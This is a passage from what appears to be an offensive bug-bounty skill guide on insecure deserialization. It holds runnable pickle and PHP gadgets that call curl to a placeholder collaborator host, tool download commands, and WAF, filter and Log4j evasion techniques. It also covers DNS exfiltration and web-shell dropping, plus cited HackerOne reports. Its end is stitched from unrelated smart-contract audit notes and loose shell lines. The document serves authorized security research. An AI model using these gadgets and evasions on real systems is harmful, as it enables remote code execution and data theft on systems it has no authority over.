| Python pickle | `__reduce__` → `os.system` | Django #1415436, Airflow #2334460 |
| Python YAML | `!!python/object/apply:os.system` | Liberapay #2467232 |
| Ruby Marshal | `Gem::SpecFetcher`/`Gem::Installer`/`Gem::Requirement` | RubyGems #1119120, #274990 |
| .NET BinaryFormatter | `TypeConfuseDelegate`, `ExpandedWrapper` | DNN #2762119 |
| PHP UAF / heap | malformed `unserialize` structures → memory corruption | #146233, #146235, #261335, #175982 |
### Writing a Minimal OOB Gadget (custom, no framework needed)

When no off-the-shelf gadget is available, a custom class with a destructive `__reduce__`
(PHP `__destruct` / `__wakeup`, Java `readObject`, .NET `OnDeserialized`) is enough to
prove execution:

```python
# Python: minimal pickle callback gadget
import pickle, os, base64
class OOB:
    def __reduce__(self):
        return (os.system, ('curl -s http://COLLAB_HOST/gadget-fired',))
print(base64.b64encode(pickle.dumps(OOB())).decode())
# Send the base64 blob to the suspect field; poll the OOB listener for "gadget-fired".
# Use a UNIQUE path label per candidate parameter for attribution.
```

```php
// PHP: minimal POP via __destruct on an allowed class
class Marker { function __destruct() { system('curl http://COLLAB_HOST/php-gadget'); } }
echo serialize(new Marker());  // O:6:"Marker":0:{}
// If the app unserializes this object and __destruct fires, you get a callback.
```
### Automation & Tooling

```bash
# Java
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
# PHP
git clone https://github.com/ambionics/phpggc
# .NET
# YSoSerial.Net (pwntester/ysoserial.net) with DotNetNuke plugin
# Ruby
# universal deserialization gadget (devcraft.io article code) + ruby-advisory-db
# JNDI
git clone https://github.com/pimps/JNDI-Exploit-Kit
# Log4j discovery
git clone https://github.com/fullhunt/log4j-scan
# OOB
interactsh-client -v -n 5
```

---
## Common Root Causes

1. **Trusting serialized data as just "data"** — `unserialize($user_input)`,
   `pickle.loads(blob)`, `Marshal.load(bytes)`, `ObjectInputStream.readObject()` with no
   type restriction. The feature is legitimate; the missing validation is the bug
   (#185907, #308489, #146233).

2. **Gadget-rich classpaths** — the presence of CommonsCollections, Monolog,
   ObjectDataProvider, Gem::Installer, or JndiLoginModule turns a harmless object
   stream into command execution. The deserializer is the door; the library is the weapon.

3. **Unsafe YAML/XML/AMF parsers instantiating arbitrary types** — SnakeYAML
   `new Yaml()` without `SafeConstructor` (#801370), `YAML.load` on untrusted config
   (#2467232), WDDX/XML-RPC `unserialize` on request params (#542670, #170144).

4. **`phar://` filesystem side effects** — PHP automatically deserializes phar metadata
   on any filesystem call; restricting uploads by extension does nothing because the
   payload can be a `.jpg` polyglot (#403083, #410882, #410237, #921288).

5. **Second-order / stored deserialization** — serialized bytes are persisted to a
   cache, session file, transient, XCom, or notification record and deserialized later,
   far from the input point (#1415436, #308489, #2334460, #361341, #3031518).

6. **Misconfigured legacy middleware** — exposed JBoss invokers (#153026), PeopleSoft
   "monitor" service (#329376), BlazeDS `messagebroker/amf` (#728614), outdated Telerik
   handler (#838196), Tomcat default servlet with writes + partial PUT + session
   persistence (#3031518).

7. **Untrusted config / connection strings reaching JNDI** — JAAS/JndiLoginModule
   settings accepted from an API (#1529790) and log4j string interpolation of headers
   (#1425474) both end in a JNDI lookup that loads remote code.

8. **Insufficient input validation in plugins/modules** — CMS plugin ecosystems
   (#198734 MyBB, #403083 WooCommerce, #562335 ownCloud OwnBackup) accept serialized
   or typed data with no class allowlist.

---
## Bypass Techniques
### When `unserialize()` classes are restricted (PHP)

- Use POP chains that rely only on magic methods (`__wakeup`, `__destruct`, `__toString`)
  present in allowed classes rather than a famous RCE gadget.
- `phar://` bypasses the need for an `unserialize()` call entirely — the deserialization
  happens inside the filesystem API (#410882 unauthenticated via `getimagesize`).
- Type juggling / `C:` custom-Serializable objects (GMP, DateInterval, SplArray,
  ZipArchive) to trigger memory-corruption UAFs when POP is blocked (#198734, #170144,
  #146233, #146235, #261335).
### When the sink is blind

- OOB callback gadget (DNS/HTTP) with a unique marker per parameter (#329376,
  #728614, #1425474). Attribute each callback to a single field.
- Sleep/time oracle before building a full chain (#838196).
- File-write gadget that drops a web-accessible shell, then fetch it directly.
### When output is filtered / escaped

- Exfiltrate via DNS labels (`<data>.COLLAB_HOST`) or HTTP query param.
- Reflect command output into a field you control that is echoed back (#2248328 leaked
  `uid=33(www-data)` in the rendered HTML response).
### Format / encoding evasions

- Base64/URL-encode the serialized blob in cookies/params when a WAF inspects raw bytes
  (e.g. `nc_form_fields=TzozN...` in #2248328 — base64 of `O:...`).
- Wrap phar metadata in a valid image (polyglot `.jpg`) to pass MIME/extension checks
  (#403083, #410882).
- Use `${${::-j}ndi:...}`-style Log4j obfuscation if a naive `${jndi:` string filter
  is present; vary protocol `ldap`/`dns`/`rmi`/`ldaps`.
### Second-order / delayedDelivery

- Poison a store (cache, XCom, notification, session file) you cannot read back; let an
  internal consumer deserialize it (#1415436, #2334460, #3031518).
- Trigger the read path asynchronously and poll your OOB listener rather than watching
  the immediate response.
### Version / CVE chaining

- Combine an arbitrary file upload (CVE-2017-11317) with deserialization
  (CVE-2019-18935) as in the Telerik reports (#838196, #1174185, #913695).
- Match a leaked exact version to a known vulnerable library before crafting a gadget
  (#3031518 Tomcat 9.0.98 → CVE-2025-24813).

---
## Gate 0 Validation
### What is NOT confirmation of deserialization RCE

Apply the same skepticism the SSRF gate applies to "the server made a request." A
deserializer being *reached* is not the same as code being *executed*.

- **A stack trace naming `unserialize`/`readObject` is not RCE.** It proves the sink was
  hit with malformed input; it does not prove a gadget ran. #170144/#146233 are
  memory-corruption bugs where the proof is a crash/sanitizer report, not a shell.
- **An error message that reflects your object string is not execution.** Echoing
  `O:8:"stdClass":0:{}` back in a 500 page means the parser rejected or formatted it.
- **A different status code for a serialized blob vs. garbage is not execution.** It
  can come from a content-type validator or a deserializer exception handler.
- **A version fingerprint alone is not RCE.** Finding Telerik 2016.2.607.40 (#838196)
  or Tomcat 9.0.98 (#3031518) is recon; you must still demonstrate the chain end to end.
### What IS confirmation of deserialization RCE

- Command output in the response — e.g. `uid=33(www-data) gid=33(www-data)` reflected
  into the rendered HTML in #2248328.
- An OOB callback generated *by the gadget* (DNS/HTTP to your unique Collaborator
  subdomain) and attributable to one parameter — #329376 (`jexboss.info`), #728614
  (AMF pingback), #1425474 (interactsh Log4Shell callback).
- A reproducible timing oracle — making the server sleep 10 seconds (#838196).
- An observable state change — file written/read/deleted (#876708, #921288, #410237).

Before writing the report, confirm all three:

1. **What can the attacker do right now?**
   - Demonstrate actual code execution: command output in the response (#2248328),
     a confirmed OOB callback generated by a gadget and tied to ONE parameter
     (#329376, #728614, #1425474), a file write, or a reproducible sleep/timing oracle
     (#838196). A stack trace naming `unserialize` alone is NOT execution.
   - For blind cases, the OOB hit must be attributable to the single sink you report —
     generate a fresh unique payload per candidate field and run negative controls.
   - For memory-corruption reports (UAF, null deref), show a reproducible crash / sanitizer
     output, not just a malformed-input error.

2. **What does the victim lose?**
   - Arbitrary OS commands with the server-process privileges (www-data in #2248328),
     full RCE → foothold → lateral movement (stated impact in #1174185), or arbitrary
     file read/write/delete (#876708 file read/write, #921288 file delete).
   - If exploitation requires a precondition (compromised cache, admin account, poisoned
     internal data), state it explicitly and score accordingly — e.g. #1415436 framed as
     privilege escalation after cache-machine takeover; #403083 requires shop-manager auth.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the sink still reachable and the exact version/library still present?
   - Does the callback/sleep/output fire reliably, not intermittently?
   - Can a second person follow only your steps and get the same result?
   - For chained CVEs, document each hop (version ID → upload → deserialize → exec) with
     the exact commands (#838196, #913695). Resolve flakiness before submitting.

---
## Real Impact Examples
### Scenario A — Java Deserialization RCE via Exposed Middleware (PeopleSoft / JBoss / Telerik pattern)
A public-facing enterprise service exposes a Java deserialization sink — JBoss
`EJBInvokerServlet` (#153026), Oracle PeopleSoft "monitor" service (#329376), or an
outdated Telerik handler (#838196). The researcher sends a ysoserial CommonsCollections
gadget. First proof is deliberately minimal: force a DNS lookup to a controlled domain
(`testing1.jexboss.info` in #329376) or make the server sleep 10 seconds (#838196).
Once execution is confirmed, a full gadget yields OS command execution with the service
account's privileges. Impact stated in #1174185: a foothold for data exfiltration,
privilege escalation, and lateral movement across the network. Severity: Critical/CVSS 10.0.
### Scenario B — Unauthenticated PHP phar:// Deserialization (Vanilla Forums pattern)
An unauthenticated attacker uploads a valid-looking `poly.jpg` containing phar metadata
with a Monolog RCE gadget embedded (#410882). A public endpoint calls `getimagesize()` /
`file_exists()` on a path derived from user input; pointing it at
`phar://uploads/poly.jpg/x` causes PHP to deserialize the archive metadata and execute
the gadget — no `unserialize()` call appears anywhere in the application source. The
same primitive was used with admin auth in #410237 to overwrite `constants.php`, and in
#921288 (Concrete CMS) to delete arbitrary files. Severity: Critical (#410882, #410237),
High (#921288 CVSS 7.3).
### Scenario C — JNDI / Log4Shell Config Injection to Reverse Shell (Aiven Kafka pattern)
A multi-tenant API lets a tenant set connector configuration. The attacker supplies a
`sasl.jaas.config` for a Debezium connector that uses `JndiLoginModule` with a
`connectionURL` pointing at an attacker-run RogueJndi server (#1529790). When the
connector starts, the JNDI lookup fetches and executes a remote class, yielding a
reverse shell on the Kafka Connect worker. The same primitive via a single Log4j header
string (`${jndi:ldap://...}`) compromised nps.acronis.com (#1425474). Severity: Critical,
CVSS 10.0; $5,000 and $1,000 bounties respectively.
### Scenario D — Second-Order Pickle Poisoning (Django / Airflow / Liberapay pattern)
Serialized objects are stored in a cache backend, XCom, or notification record and read
back with `pickle.load`. An attacker who can write into the store (#1415436 Django caches,
#2334460 Airflow XComs bypassing `enable_xcom_pickling=False`, #361341 Liberapay
notifications) plants a `__reduce__` gadget. On the next read, `os.system` executes with
the application's privileges. The bug is Critical where the store is attacker-writable,
Medium/Low where it requires prior machine/account compromise — always state the
precondition as the reports did.
### Scenario E — .NET Cookie Deserialization to File Write/RCE (DotNetNuke pattern)
A `DNNPersonalization` cookie on a DotNetNuke site is deserialized with BinaryFormatter
(#876708, and CVE-2017-9822 in #2762119). The attacker generates a payload with
ysoserial.net's DotNetNuke plugin using the `ExpandedWrapper` +
`ObjectDataProvider` gadget and places it in the cookie. On the next request the
formatter reconstructs the object graph, invoking `FileSystemUtils` methods that yield
arbitrary file read/write and OS command execution. #2762119 demonstrated `write_file`
mode; #876708 reported RCE plus file read/write on a U.S. DoD host. Severity: High to
Critical, no auth required (the cookie is client-controlled).
### Scenario F — Ruby Marshal Gadget via Trusted API Response (RubyGems pattern)
RubyGems' `GET /api/v1/dependencies` responded with `Marshal.dump` instead of JSON
(#1119120). Because Bundler consumes that response with `Marshal.load`, an attacker
who can control or intercept the response can deliver the universal Ruby 2.x–3.x
gadget (`Gem::SpecFetcher` + `Gem::Installer` + crafted `Gem::Requirement`) for RCE on
the client. Separately, a `YAML.load` sink in gem-checksum parsing was escalated into
`Marshal.load` using classes available in the application for server-side RCE at
`/api/v1/gems` (#274990, $1,500). Lesson: any API that serializes objects is also a
client-side deserialization attack surface when traffic can be influenced.

---
## Disclosed Report Citations (30)

> Every ID below is a real HackerOne report present in the 84-report study pack. Format:
> **Company — title** ([H1 #id](https://hackerone.com/reports/id)) — subclass, technique, year/bounty.

1. **Internet Bug Bounty — GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE]** ([H1 #198734](https://hackerone.com/reports/198734)) — PHP `unserialize` type confusion, crafted `C:3:"GMP"` object → `__wakeup`/`convert_to_long` ZVAL confusion RCE, 2017.
2. **U.S. Dept Of Defense — Remote Code Execution through DNN Cookie Deserialization** ([H1 #876708](https://hackerone.com/reports/876708)) — .NET BinaryFormatter in `DNNPersonalization` cookie, ysoserial.net DotNetNuke plugin → file read/write + RCE, 2020.
3. **U.S. Dept Of Defense — Remote Code Execution via Insecure Deserialization in Telerik UI** ([H1 #838196](https://hackerone.com/reports/838196)) — .NET Telerik UI, CVE-2017-11317 upload → CVE-2019-18935 deserialization, sleep oracle, 2020.
4. **Aiven Ltd — Kafka Connect RCE via connector SASL/JAAS JndiLoginModule configuration** ([H1 #1529790](https://hackerone.com/reports/1529790)) — JNDI injection, `sasl.jaas.config` → RogueJndi → reverse shell, 2022 / $5,000.
5. **Starbucks — Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet** ([H1 #153026](https://hackerone.com/reports/153026)) — Java ysoserial `CommonsCollections1` against exposed invoker servlet, 2016.
6. **RubyGems — Bundler's RCE with response using Marshal** ([H1 #1119120](https://hackerone.com/reports/1119120)) — Ruby `Marshal.load` universal gadget (`Gem::SpecFetcher`/`Gem::Installer`) via `/api/v1/dependencies` response, 2021.
7. **U.S. Dept Of Defense — Remote Code Execution via Insecure Deserialization in Telerik UI (CVE-2019-18935)** ([H1 #1174185](https://hackerone.com/reports/1174185)) — .NET Telerik `WebResource.axd?type=rau`, upload + deserialization RCE, 2021.
8. **Liberapay — Unsafe deserialization escalates a SQL injection to RCE** ([H1 #361341](https://hackerone.com/reports/361341)) — Python `pickle` in notification serializer, second-order RCE escalation, 2018.
9. **U.S. Dept Of Defense — Remote Code Execution via CVE-2019-18935** ([H1 #913695](https://hackerone.com/reports/913695)) — .NET Telerik UI version fingerprint → CVE chain → RCE, 2020.
10. **Linux Foundation Decentralized Trust — RCE in Hyperledger Fabric SDK for Java** ([H1 #801370](https://hackerone.com/reports/801370)) — Java SnakeYAML arbitrary type instantiation (no `SafeConstructor`), 2020 / $200 / CVSS 6.9.
11. **U.S. Dept Of Defense — Remote Code Execution (RCE) in a DoD website** ([H1 #329376](https://hackerone.com/reports/329376)) — Java Oracle PeopleSoft "monitor" service deserialization, OOB DNS callback, 2018.
12. **h1-5411-CTF — LFI / Deserialization / XXE vulnerability** ([H1 #415233](https://hackerone.com/reports/415233)) — PHP serialization bug chained with LFI + XXE-as-SSRF, 2018.
13. **Django — Deserialization of potentially malicious data to RCE** ([H1 #1415436](https://hackerone.com/reports/1415436)) — Python `pickle.load` in cache backends, second-order privilege escalation, 2021.
14. **Ian Dunn — unchecked unserialize usage in WordPress-Functionality-Plugin-Skeleton** ([H1 #185907](https://hackerone.com/reports/185907)) — PHP `unserialize()` on remote response body without class allowlist, PHP POP, 2016 / $25.
15. **U.S. Dept Of Defense — Remote Code Execution (RCE) in a DoD website** ([H1 #329399](https://hackerone.com/reports/329399)) — Java PeopleSoft deserialization, OOB DNS (`dod.jexboss.info`), 2018.
16. **U.S. Dept Of Defense — Remote Code Execution (RCE) in a DoD website** ([H1 #329400](https://hackerone.com/reports/329400)) — Java PeopleSoft deserialization (related to #329376/#329397/#329399), 2018.
17. **Vanilla — critical (PHP object injection via config)** ([H1 #407552](https://hackerone.com/reports/407552)) — PHP object injection through `Garden.TouchIcon` config → deserialization path, 2018 / $600.
18. **mtn_group — CVE-2017-9822 DotNetNuke Cookie Deserialization RCE** ([H1 #2762119](https://hackerone.com/reports/2762119)) — .NET `ExpandedWrapper`/`ObjectDataProvider` gadget in `DNNPersonalization` cookie, 2024.
19. **Nextcloud — ActivityPub shared-inbox actor spoofing** ([H1 #461308](https://hackerone.com/reports/461308)) — deserialization-adjacent signed-request/keyId trust flaw, unauthenticated impersonation, 2019 / $50.
20. **Vanilla — high (PHP object injection via password hash method)** ([H1 #410212](https://hackerone.com/reports/410212)) — PHP object injection via admin-controlled hash method → file delete/backdoor, 2018 / $300.
21. **Vanilla — critical (PHAR deserialization in import controller)** ([H1 #410237](https://hackerone.com/reports/410237)) — PHP `phar://` via unprotected `file_exists()`, constants.php overwrite, 2018 / $600.
22. **ownCloud — deserialization in OwnBackup app** ([H1 #562335](https://hackerone.com/reports/562335)) — PHP deserialization RCE via admin-uploaded XML files, 2019.
23. **Vanilla — critical (unauthenticated PHAR deserialization)** ([H1 #410882](https://hackerone.com/reports/410882)) — PHP `phar://` via `getimagesize()`, unauthenticated RCE, 2018 / $600.
24. **nextcloud — RCE on Wordpress website** ([H1 #2248328](https://hackerone.com/reports/2248328)) — PHP Monolog gadget in base64 `nc_form_fields` cookie → `unserialize` → `system('id')`, output in response, 2023.
25. **RubyGems — unsafe object deserialization (gem package)** ([H1 #274990](https://hackerone.com/reports/274990)) — Ruby `YAML.load` → `Marshal.load` escalation → RCE at `/api/v1/gems`, 2017 / $1,500.
26. **ibb — CVE-2025-24813 RCE via write-enabled Default Servlet** ([H1 #3031518](https://hackerone.com/reports/3031518)) — Java Tomcat partial PUT + file-based session persistence + gadget library → deserialization RCE, 2025 / $4,323.
27. **liberapay — Unsafe yaml load can lead to remote code execution** ([H1 #2467232](https://hackerone.com/reports/2467232)) — Python `yaml.load` arbitrary object construction, 2024.
28. **Rootstock Labs — Attacker can add arbitrary data to the blockchain without paying gas** ([H1 #396954](https://hackerone.com/reports/396954)) — Java deserialization in RSKj JSON-RPC layer, 2018 / CVSS 9.3.
29. **Automattic — Authenticated Code Execution through Phar deserialization in CSV Importer (WooCommerce)** ([H1 #403083](https://hackerone.com/reports/403083)) — PHP `phar://` in CSV importer path param → RCE (shop-manager auth), 2018.
30. **Acronis — [CVE-2021-44228] nps.acronis.com vulnerable to log4shell** ([H1 #1425474](https://hackerone.com/reports/1425474)) — Log4Shell JNDI injection via header, OOB callback, 2021 / $1,000 / CVSS 10.0.

---
## Related Skills & Chains

- **`hunt-rce`** — Deserialization is a direct RCE primitive. Once you have command exec,
  use `hunt-rce` tradecraft to upgrade: `id`/`/etc/passwd` proof, SUID/sudo enumeration,
  then persistence. Chain: deser gadget → `whoami` → privesc.
- **`hunt-ssrf`** — JNDI lookups (`ldap://`, `dns://`, `rmi://`) and phar URLs (`phar://`)
  are URL-like fetches; SSRF-to-internal-service can deliver a serialized blob to a
  deserializing endpoint. Chain: SSRF → internal deserialization sink → RCE.
- **`hunt-file-upload`** — Required for the phar:// class: you must land a polyglot file
  on disk before a filesystem call deserializes it (#403083, #410882, #410237, #921288).
- **`hunt-cloud-misconfig`** — Poisoned caches/session stores (#1415436, #3031518) and
  exposed middleware (JBoss invokers, PeopleSoft monitor) are misconfiguration-first;
  this skill supplies the RCE payload half of the chain.
- **`hunt-log4j` / `hunt-jndi`** — Shared primitive with Log4Shell and JNDI injection
  (#1529790, #1425474); reuse the RogueJndi/JNDI-Exploit-Kit infrastructure.
- **`security-arsenal`** — Load the deserialization fingerprint table (`rO0A`, `rO0ABXQ=`,
  `O:8:"stdClass"`, `\x80\x04`, `\x04\x08`, `AAEAAAD/////`, `${jndi:`) before reviewing
  cookies/bodies; pair with ysoserial, phpggc, YSoSerial.Net, and ruby gadget kits.
- **`triage-validation`** — Apply the Gate 0 gate: blind RCE needs a unique, single-
  parameter OOB callback or a reproducible sleep oracle; command output in the response
  is the strongest proof (#2248328). Never report a stack trace naming `unserialize`
  as RCE on its own.


---

## Merged Source Knowledge

This section consolidates **174 unique knowledge blocks** from 12 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (202 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-10-closing-accounts/fv-anc-10-cl2-operations-on-accounts-marked-as-closed.md`

## TLDR

An account bearing a closed discriminator should be rejected at the start of any instruction that would read or mutate it. Failing to check allows a closed account to be passed into an instruction and processed as if still valid.

## Detection Heuristics

**No Closed-Account Guard at Instruction Entry**
- Instructions that accept an account type that can be closed but do not read the first 8 bytes to compare against the closed discriminator
- `Account<'info, T>` deserialization succeeding even after the closed discriminator is set, because Anchor does not automatically reject closed accounts in all versions

**Stale Data Usage After Closure**
- Code that reads fields from a closed account (e.g., `ctx.accounts.order.amount`) without first verifying the discriminator
- Iteration over a list of accounts from `ctx.remaining_accounts` without per-account closed-discriminator check

**Revival Path Not Guarded**
- Same-transaction revival: an earlier instruction closes the account and a later instruction in the same transaction reads it without discriminator check

## False Positives

- Accounts using Anchor's `#[account(close = destination)]` where the framework enforces the discriminator and subsequent Anchor deserialization automatically rejects closed accounts in newer versions
- Instruction designed specifically to handle the closure lifecycle and intentionally receives closed accounts for cleanup purposes


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-13-program-management/fv-anc-13-cl2-uninitialized-vec-capacity-bug.md`

## TLDR

Creating a `Vec` with `Vec::with_capacity(n)` allocates space for n elements but leaves the length at 0. Accessing elements of a capacity-allocated but not length-populated Vec via index operators will produce an out-of-bounds panic. If an initialization instruction fails to push actual elements and a subsequent instruction assumes the Vec is populated, state will be incorrect or instructions will panic.

## Detection Heuristics

**with_capacity Without Corresponding Pushes**
- `Vec::with_capacity(n)` called during account initialization or instruction processing without a corresponding loop that pushes n default elements
- Account state field is a Vec; after initialization its length is 0 but the protocol's subsequent logic reads from it by index assuming length == capacity

**Default Initialization Confusion**
- Account struct derives `Default` for a Vec field; `Default::default()` for Vec is an empty Vec with zero length; code that assumes the Vec contains pre-allocated slots will panic on first access
- `account.items[0]` accessed after initialization without checking `items.len() > 0`

**Serialization Length Mismatch**
- Account size allocated for n elements (via `space = 8 + n * ELEMENT_SIZE`) but Vec serialized with length prefix of 0; deserialized length is 0 and index access panics
- Realloc extends account space but Vec's length field is not updated to match the new capacity

## False Positives

- Vec capacity allocation is immediately followed by a fill loop or `.extend(iter)` that populates all capacity slots before the account is used
- Protocol never accesses Vec by index; all access is via iteration over the Vec's actual elements, which correctly handles a zero-length Vec


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-5-cross-program-invocation-cpi/fv-anc-5-cl6-post-cpi-ownership-change.md`

## TLDR

A callee program can call `assign` on any account it is authorized to write, changing that account's owner to an arbitrary program. If the caller does not re-verify account ownership after the CPI, it may continue operating on an account now owned by an attacker-controlled program.

## Detection Heuristics

**No Ownership Re-Verification After CPI**
- `ctx.accounts.target.owner` not checked after `invoke` or `invoke_signed` completes
- Account ownership assumed to be unchanged after CPI to an unaudited or user-supplied program
- Fields read or mutations performed on an account after a CPI without confirming `account.owner == &expected_program_id`

**Writable Accounts Passed to Unknown Programs**
- `AccountInfo` passed as writable to a CPI where the target program is not a well-known audited program, creating a surface for ownership reassignment
- Dynamic program ID used as CPI target combined with writable accounts that the current program later relies on

**No Post-CPI Invariant Checks**
- Instruction performs a series of operations after a CPI without any validation that account state (owner, data, lamports) is within expected bounds

## False Positives

- CPI target is a well-known program (SPL Token, System Program, Metaplex) that does not call `assign` as part of its instruction
- Account ownership is enforced at the Anchor deserialization level on the next instruction, making within-instruction re-check redundant only if no further reads occur after the CPI in the same instruction


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/fv-anc-7-cl1-unvalidated-token-mint-and-owner.md`

## TLDR

Token accounts on Solana carry a `mint` and an `owner` field. Without validating both, an attacker can substitute a token account for a different mint (causing the program to treat the wrong token as the expected asset) or a different owner (allowing unauthorized access to balances).

## Detection Heuristics

**Token Account Accepted Without mint Constraint**
- `Account<'info, TokenAccount>` in a context struct without `#[account(token::mint = expected_mint)]` or equivalent `constraint = token_account.mint == expected_mint.key()`
- Token account deserialized and used without checking `.mint` against the program's known mint address

**Token Account Accepted Without authority/owner Constraint**
- Token account accepted without `#[account(token::authority = expected_authority)]` or a manual check that `token_account.owner == expected_owner.key()`
- Instruction performs a debit or credit on a token account without verifying it belongs to the expected user

**Both mint and owner Unchecked**
- `InterfaceAccount<'info, TokenAccount>` or `Account<'info, TokenAccount>` used raw without either mint or owner validation, relying solely on the account being owned by the Token Program

## False Positives

- Token account is an ATA derived on-chain from the user and mint via `#[account(associated_token::mint = mint, associated_token::authority = user)]`, which implicitly enforces both mint and owner
- Mint is validated via a separate `has_one = mint` constraint on a vault account that also stores the mint pubkey


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-9-type-cosplay/fv-anc-9-cl1-not-using-discriminators-to-validate-account-types.md`

## TLDR

Anchor automatically prepends an 8-byte discriminator to every `#[account]` struct. When deserializing accounts manually or accepting them via `UncheckedAccount`, failing to check the discriminator allows an attacker to pass an account of a different type that happens to have the same owner program, causing type confusion.

## Detection Heuristics

**Manual Deserialization Without Discriminator Check**
- `MyStruct::try_from_slice(&ctx.accounts.account.data.borrow())` or `AnchorDeserialize::deserialize(&mut data)` called without first verifying `&data[..8] == MyStruct::DISCRIMINATOR`
- `borsh::from_slice` on account data that skips the first 8 bytes without comparing against the expected discriminator

**UncheckedAccount Deserialized Without Discriminator**
- `UncheckedAccount<'info>` data read and interpreted as a known struct without discriminator verification
- Account from `ctx.remaining_accounts` deserialized as `MyAccountType` without checking the discriminator bytes

**Type Cosplay Attack Surface**
- Program has multiple account types with identical field layouts or compatible sizes owned by the same program; without discriminator checks, one can be substituted for another
- Admin, user, and vault account structs with overlapping field offsets and same owner program

## False Positives

- Anchor's `Account<'info, T>` deserialization used, which automatically checks the discriminator during `try_deserialize`
- Account is a token account or system account with a fixed layout defined by an external program that does not use Anchor discriminators; owner check is sufficient


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-9-type-cosplay/fv-anc-9-cl2-account-structures-without-discriminators.md`

## TLDR

Account structs defined without Anchor's `#[account]` attribute do not receive an automatic 8-byte discriminator. This means all instances of such structs look identical at the byte level regardless of their intended type, enabling type substitution attacks across any instruction that accepts them.

## Detection Heuristics

**Structs Used as Accounts Without #[account] Attribute**
- `pub struct MyState { ... }` used as an on-chain account type without `#[account]` attribute, meaning no discriminator is prepended
- Struct deserialized directly via `borsh::BorshDeserialize` derive without discriminator bytes in the layout

**Manual Discriminator Without Enforcement**
- Struct includes a `discriminator: [u8; 8]` field but no instruction checks this field against a known constant before using the account
- `DISCRIMINATOR` constant defined but not compared during account validation

**Multiple Account Types With Identical Initial Fields**
- Two or more account structs share the same first field types (e.g., `authority: Pubkey` as the first field), making them indistinguishable without a discriminator when the owner program is the same

**Deserializer Does Not Reject Wrong Discriminator**
- Custom `try_deserialize` implementation does not check the discriminator, allowing any account data to deserialize successfully as any type

## False Positives

- Structs used only as instruction data (not on-chain accounts) and never deserialized from account data; discriminators are not relevant for instruction parameters
- Program uses a single account type and type confusion between types is structurally impossible


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-3-upgrade-safety/fv-mov-3-cl3-struct-field-evolution.md`

## TLDR

Sui Move enforces forward-compatible struct evolution: fields may only be appended, never reordered or removed. Violating this rule causes existing on-chain objects (created by the old code) to fail deserialization when accessed by the new code.

## Detection Heuristics

- When reviewing an upgrade diff, check whether any struct field was removed, renamed, or reordered
- New fields must be appended at the end; reordering even non-sensitive fields breaks binary layout
- Verify the upgrade's migration function addresses any objects that must be touched before the new code accesses them
- Types with `Option<T>` for new fields are safer than mandatory fields - verify the new field is `Option<T>` or has a safe default

## False Positives

- Fields only appended (never reordered or removed) - this is the only safe pattern
- New fields are optional with documented safe defaults
- No existing on-chain objects of the modified type (brand new struct in the upgrade)


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-3-upgrade-safety/readme.md`

# FV-MOV-3: Package Upgrades and Lifecycle

Sui Move has unique upgrade semantics: `init` does not run on upgrade, struct fields are forward-compatible only, and `UpgradeCap` is the single point of control over future code. Errors here are typically critical or high severity.

## Cases

- [fv-mov-3-cl1-init-upgrade-assumptions.md](fv-mov-3-cl1-init-upgrade-assumptions.md) - Logic assumes `init` re-runs on upgrade; post-upgrade state left uninitialized
- [fv-mov-3-cl2-version-check-missing.md](fv-mov-3-cl2-version-check-missing.md) - Shared objects have no `version` field or public functions do not check it
- [fv-mov-3-cl3-struct-field-evolution.md](fv-mov-3-cl3-struct-field-evolution.md) - Fields reordered or removed in upgrade, breaking existing object deserialization
- [fv-mov-3-cl4-upgrade-cap-security.md](fv-mov-3-cl4-upgrade-cap-security.md) - `UpgradeCap` held by single EOA or destroyed prematurely


### From `hunt-skills/bountyforge/skills/smart-contract-audit/reference/ton/fv-ton-1-message-handling/fv-ton-1-cl3-deserialization-and-end-parse.md`

## TLDR

Omitting `end_parse()` after deserializing a message or storage slice silently ignores trailing bytes, masking injected extra data, storage corruption, or format version mismatches.

## Detection Heuristics

**Missing end_parse after message body read**
- `in_msg_body~load_uint(32)` (opcode), followed by field reads, with no final `in_msg_body.end_parse()` or `in_msg_body~end_parse()`
- Handler returns or continues after all expected fields are read without verifying the slice is empty

**Missing end_parse after storage load**
- `get_data().begin_parse()` sequence that loads all fields but does not end with `end_parse()`
- Storage loaded into a slice variable reused across multiple handlers, each reading some fields - last handler does not verify exhaustion

**Bit/ref layout mismatch**
- `store_uint(x, N)` on the sending side but `load_uint(M)` where `M ≠ N` on the receiving side
- References stored in a different order than they are loaded, causing field-shift bugs
- Optional fields (present/absent conditionally) handled inconsistently between writer and reader

## False Positives

- `end_parse()` absent but the slice is provably empty after all reads due to a fixed-length format with no variable-length fields - confirm this holds for all code paths, including future versions
- Forward payload slices intentionally passed through to another contract unmodified, where the downstream contract performs its own validation


### From `hunt-skills/hunt-deserialization/SKILL.md`

## Crown Jewel Targets

Deserialization bugs are almost always Critical — they lead directly to RCE without prerequisite conditions.

**Highest-value chains:**
- **Java ysoserial gadget chains** — CommonsCollections, Spring, JNDI, Groovy gadgets → full OS command execution
- **PHP Object Injection** — `__wakeup` / `__destruct` magic methods → file write / RCE
- **Python pickle** — `pickle.loads(attacker_data)` → `__reduce__` → `os.system('id')`
- **.NET BinaryFormatter** — TypeConfuseDelegate gadget chain → RCE
- **Ruby Marshal.load** — Gem::Requirement, Gem::Installer gadgets → RCE
- **JNDI injection** — Log4Shell pattern: `${jndi:ldap://attacker/a}` → class load → RCE

---

# Java serialized objects start with AC ED 00 05 (hex) or rO0A (base64)
echo "rO0ABXQ=" | base64 -d | xxd | head -1  # shows: ac ed 00 05

# Apache Shiro: rememberMe cookie present
